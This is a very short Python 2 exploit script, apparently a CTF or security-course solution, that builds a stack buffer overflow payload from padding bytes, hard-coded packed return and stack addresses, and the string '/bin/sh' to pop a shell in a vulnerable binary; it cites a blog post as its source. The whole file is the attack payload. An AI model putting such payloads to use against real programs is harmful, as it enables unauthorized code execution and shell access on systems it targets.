from shellcode import shellcode
from struct import pack
print 'A'*18+2*pack("<I",0x08048eed)+pack("<I",0xbffea7f4)+"/bin/sh"
#citation:
#https://juejin.im/post/5aa11939f265da239c7aeff1
